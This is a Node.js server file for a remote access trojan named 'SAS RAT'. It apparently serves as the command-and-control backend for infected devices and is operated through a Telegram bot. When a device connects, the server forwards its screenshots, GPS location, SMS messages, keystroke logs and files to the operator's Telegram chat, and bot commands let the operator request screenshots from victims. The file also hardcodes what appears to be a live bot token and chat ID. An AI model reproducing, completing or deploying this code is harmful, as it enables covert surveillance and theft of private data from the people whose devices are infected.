const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const express = require('express');
const app = express();
app.use(express.json());  // للـ webhooks

const TOKEN = '7974579225:AAE7NS2E4czBNoll1yh23SqVAlOPt2i-5QM';
const CHAT_ID = '659334247';
const bot = new TelegramBot(TOKEN);

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
const wss = new WebSocket.Server({ server });

// Webhook endpoint لتلجرام (بدلاً من polling)
app.post(`/bot${TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ضبط webhook (شغّل مرة واحدة عند الـ deploy)
bot.setWebHook(`${process.env.RENDER_EXTERNAL_URL || 'https://sas-dfm3.onrender.com'}/bot${TOKEN}`);

wss.on('connection', (ws) => {
  console.log('Device connected!');
  bot.sendMessage(CHAT_ID, '✅ Device connected! Send /help for commands.');

  ws.on('message', (data) => {
    const msg = JSON.parse(data);
    if (msg.type === 'screenshot') {
      bot.sendPhoto(CHAT_ID, msg.data, { caption: '📸 Screenshot from device' });
    } else if (msg.type === 'location') {
      bot.sendLocation(CHAT_ID, msg.lat, msg.lon, { caption: '📍 Location' });
    } else if (msg.type === 'sms') {
      bot.sendMessage(CHAT_ID, `📱 SMS: ${msg.content}`);
    } else if (msg.type === 'keylog') {
      bot.sendMessage(CHAT_ID, `⌨️ Keylog: ${msg.keys}`);
    } else if (msg.type === 'files') {
      bot.sendDocument(CHAT_ID, msg.data, { caption: '📁 File from device' });
    }
  });

  ws.on('close', () => {
    bot.sendMessage(CHAT_ID, '❌ Device disconnected!');
  });
});

bot.onText(/\/start/, (msg) => {
  if (msg.chat.id.toString() === CHAT_ID) {
    bot.sendMessage(CHAT_ID, '🤖 SAS RAT Ready! Commands:\n/screenshot - Take photo\n/location - Get location\n/sms - List SMS\n/keylog - Start keylogger\n/files - List files\n/help - This menu');
  }
});

bot.onText(/\/screenshot/, (msg) => {
  if (msg.chat.id.toString() === CHAT_ID) {
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ command: 'screenshot' }));
      }
    });
    bot.sendMessage(CHAT_ID, '📸 Screenshot command sent!');
  }
});

bot.onText(/\/help/, (msg) => {
  if (msg.chat.id.toString() === CHAT_ID) {
    bot.sendMessage(CHAT_ID, 'Commands: /start, /screenshot, /location, /sms, /keylog, /files');
  }
});

console.log('Bot webhook set! Service live at https://sas-dfm3.onrender.com');
